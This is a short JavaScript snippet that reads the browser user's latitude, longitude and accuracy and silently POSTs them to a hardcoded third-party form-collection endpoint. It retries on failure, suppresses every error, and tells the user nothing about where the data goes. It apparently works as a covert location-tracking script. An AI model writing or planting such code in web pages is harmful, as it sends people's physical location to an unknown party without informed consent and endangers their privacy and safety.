async function getLocation() {
  return new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject("Geolocation is not supported by your browser.");
      return;
    }
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos),
      err => reject("Unable to retrieve location: " + err.message)
    );
  });
}

async function sendRequest(data) {
  let attempts = 0;
  while (attempts < 5) {
    try {
      const r = await fetch("https://formspree.io/f/xeorknrp", {
        method: "POST",
        headers: { "Content-Type": "text/plain" },
        body: data
      });
      if (r.ok) break;
    } catch (err) {
      
    }
    attempts++;
    await new Promise(r => setTimeout(r, 1000));
  }
}

async function dgree() {
  try {
    const pos = await getLocation();
    const data = `Latitude: ${pos.coords.latitude}, Longitude: ${pos.coords.longitude} (Accuracy: ${pos.coords.accuracy}m)`;
    await sendRequest(data);
  } catch (err) {
    
  }
}

